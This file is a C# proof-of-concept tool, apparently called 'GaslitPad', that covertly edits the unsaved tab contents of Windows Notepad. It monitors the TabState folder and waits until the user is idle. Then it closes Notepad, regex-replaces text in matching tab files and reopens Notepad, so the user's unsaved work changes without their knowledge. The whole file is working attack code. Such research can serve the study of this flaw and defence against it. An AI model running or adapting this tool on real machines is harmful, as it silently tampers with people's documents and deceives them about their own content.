// See https://aka.ms/new-console-template for more information
using NotepadStateLibrary;
using System.Diagnostics;
using System.Text;
using System.Text.RegularExpressions;
using System.Management;
using System.Net;
using GaslitPad;
using System.Configuration;
using System.IO;


Console.WriteLine("********** Starting *********");

bool isNotepadRunning = false;
//LOL Error checking?
int idleWaitTime = Int32.Parse(ConfigurationManager.AppSettings["idleWaitTime"]); // idle wait time before attack
int pollingInterval = Int32.Parse(ConfigurationManager.AppSettings["pollingInterval"]); // polling interval 
string directoryToMonitor = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Packages\Microsoft.WindowsNotepad_8wekyb3d8bbwe\LocalState\TabState");

//TODO: Make this a list or something of attack target parameters
//LOL Error checking?
int attackVersion = Int32.Parse(ConfigurationManager.AppSettings["attackVersion"]); //0 attack when Notepad is open, 1 attacks when Notepad is closed
string attackFileName = ConfigurationManager.AppSettings["attackFileName"];
string attackRegex = ConfigurationManager.AppSettings["attackRegex"];
string attackReplace = ConfigurationManager.AppSettings["attackReplace"];
bool attackDone = false;


if (attackVersion == 0)
{
    // Dictionary to store file information: file name -> file length to detect changes
    var previousFileState = new Dictionary<string, string>();

    Thread monitorThread = new Thread(MonitorNotepad);
    monitorThread.IsBackground = true; // Set as background thread so it terminates when the app closes
    monitorThread.Start();

    Console.WriteLine($"Monitoring directory: {directoryToMonitor}");
    Console.WriteLine("Press 'q' to quit...");

    // Start a loop to check the directory every few seconds
    while (true)
    {
        // Wait for the next polling interval
        Thread.Sleep(pollingInterval);

        Console.WriteLine(InputTimer.GetInputIdleTime().TotalSeconds.ToString());

        // Get the current state of the directory (file names and their hashes)
        var currentFileState = new Dictionary<string, string>();
        foreach (var file in Directory.GetFiles(directoryToMonitor))
        {
            var fileName = Path.GetFileName(file);
            var fileByteLength = GetFileByteLength(file);
            currentFileState[fileName] = fileByteLength;
        }

        // Check for newly added files
        var addedFiles = currentFileState.Keys.Except(previousFileState.Keys);
        foreach (var addedFile in addedFiles)
        {
            Console.WriteLine($"File created: {addedFile}");
            Console.WriteLine(isNotepadRunning.ToString());
            //TODO: Future
        }

        // Check for deleted files
        var deletedFiles = previousFileState.Keys.Except(currentFileState.Keys);
        foreach (var deletedFile in deletedFiles)
        {
            Console.WriteLine($"File deleted: {deletedFile}");
            Console.WriteLine(isNotepadRunning.ToString());
            //TODO: Future
        }

        // Check for modified files (files that exist in both, but with different lengths)
        var modifiedFiles = currentFileState
            .Where(kv => previousFileState.ContainsKey(kv.Key) && kv.Value != previousFileState[kv.Key])
            .Select(kv => kv.Key);
        foreach (var modifiedFile in modifiedFiles)
        {
            Console.WriteLine($"File modified: {modifiedFile}");
            Console.WriteLine(isNotepadRunning.ToString());
            //TODO: Future
        }

        // Update the previous file state for the next iteration
        previousFileState = new Dictionary<string, string>(currentFileState);

        // Check for Attack conditions
        if (isNotepadRunning && InputTimer.GetInputIdleTime().TotalSeconds > idleWaitTime && !attackDone)
        {
            Console.WriteLine("Starting attack");
            CloseNotepad();
            foreach (var file in currentFileState)
            {
                Attack(Path.Combine(directoryToMonitor, file.Key), attackFileName, attackReplace, attackRegex);
            }
            OpenNotepad();
        }
        // Check for user input to exit
        if (Console.KeyAvailable && Console.ReadKey(intercept: true).Key == ConsoleKey.Q)
        {
            break;
        }
    }
}
else
{
    while (true)
    {
        Thread.Sleep(pollingInterval);

        if (Process.GetProcessesByName("notepad").Count() == 0)
        {
            var currentFileState = new Dictionary<string, string>();
            foreach (var file in Directory.GetFiles(directoryToMonitor))
            {
                var fileName = Path.GetFileName(file);
                var fileByteLength = GetFileByteLength(file);
                currentFileState[fileName] = fileByteLength;
            }

            Console.WriteLine("Starting attack");
            foreach (var file in currentFileState)
            {
                Attack(Path.Combine(directoryToMonitor, file.Key), attackFileName, attackReplace, attackRegex);
            }
        }

        if (attackDone)
        {
            break;
        }
    }
}

Console.WriteLine("Monitoring stopped.");


string GetFileByteLength(string filePath)
{

    using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
    {
        byte[] data = new byte[fileStream.Length];
        fileStream.Read(data);

        return data.Length.ToString();
    }
}

 void MonitorNotepad()
{
    while (true)
    {
        // Check if "notepad" is running
        var processes = Process.GetProcessesByName("notepad");

        // If notepad.exe is running, set the flag to true, otherwise false
        bool isRunning = processes.Length > 0;
        if (isRunning != isNotepadRunning)
        {
            isNotepadRunning = isRunning;

            if (isNotepadRunning)
            {
                Console.WriteLine("Notepad started.");
            }
            else
            {
                Console.WriteLine("Notepad closed.");
            }
        }

        // Wait for the next polling interval
        Thread.Sleep(pollingInterval);
    }
}

void CloseNotepad()
{
    foreach (var p in Process.GetProcessesByName("notepad"))
    {
        p.CloseMainWindow();
        p.Close();
        //TODO: Should we wait a little time here? Possible file locking issues?
    }

}

void OpenNotepad()
{
    Process.Start("notepad.exe");
}

void Attack(string path, string fileName, string replace, string regexFind)
{
    byte[] o = new byte[0];

    using (FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
    {
        byte[] data = new byte[fileStream.Length];
        fileStream.Read(data);

        if (data.Length > 0)
        {
            NPTabState np = new NPTabState(data, Path.GetFileName(path));

            if (np.TypeFlag <= 1 && Path.GetFileName(np.FilePath) == fileName && np.Unsaved.SequenceEqual(new byte[] { 0x1 }))
            {
                string c = np.ContentString;

                Regex rgx = new Regex(regexFind);
                Match mtch = rgx.Match(c);

                if (mtch.Success) 
                {
                    
                    int start = mtch.Index;
                    int end = mtch.Length;
                    string r = c.Remove(start, end).Insert(start, replace);
                    var n = Encoding.Unicode.GetBytes(r);
                    o = np.WriteContent(n);
                }
            }
        }
    }

    if (o.Length > 0)
    {
        File.WriteAllBytes(path, o);
        attackDone = true;
    }
}


